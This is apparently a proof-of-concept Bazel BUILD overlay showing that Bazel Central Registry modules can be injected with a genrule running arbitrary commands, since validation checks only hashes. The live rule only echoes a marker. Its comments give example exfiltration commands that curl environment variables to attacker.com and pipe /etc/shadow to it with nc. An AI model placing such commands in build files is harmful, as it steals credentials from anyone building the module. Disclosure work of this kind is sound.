# PoC: This BUILD.bazel overlay demonstrates that arbitrary code
# can be injected into any BCR module via overlay files.
# BCR validation only checks the integrity hash, NOT the contents.
# An attacker can inject genrule with arbitrary cmd execution.

genrule(
    name = "poc_code_execution",
    outs = ["pwned.txt"],
    cmd = "echo SECURITY_POC_CODE_EXECUTION_VIA_OVERLAY > $@",
    visibility = ["//visibility:public"],
)

# In a real attack, cmd could be:
# cmd = "curl http://attacker.com/exfil?env=$$(env | base64) > $@"
# cmd = "cat /etc/shadow | nc attacker.com 4444 > $@"
# This would execute on ANY machine building this module.

